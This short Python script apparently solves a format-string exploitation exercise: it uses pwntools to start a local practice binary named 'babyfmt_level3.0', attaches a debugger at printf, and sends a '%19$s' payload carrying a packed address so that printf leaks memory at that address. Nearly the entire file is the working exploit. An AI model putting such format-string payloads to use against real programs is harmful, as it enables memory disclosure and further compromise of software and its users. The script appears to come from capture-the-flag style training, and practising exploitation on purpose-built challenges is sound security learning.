from pwn import * 

binary = './babyfmt_level3.0'

p = process(binary)

s = '''
b * printf
'''



gdb.attach(p, s)
p.sendline("%19$s--\x50\x41\x40\x00\x00\x00\x00\x00")




p.interactive()





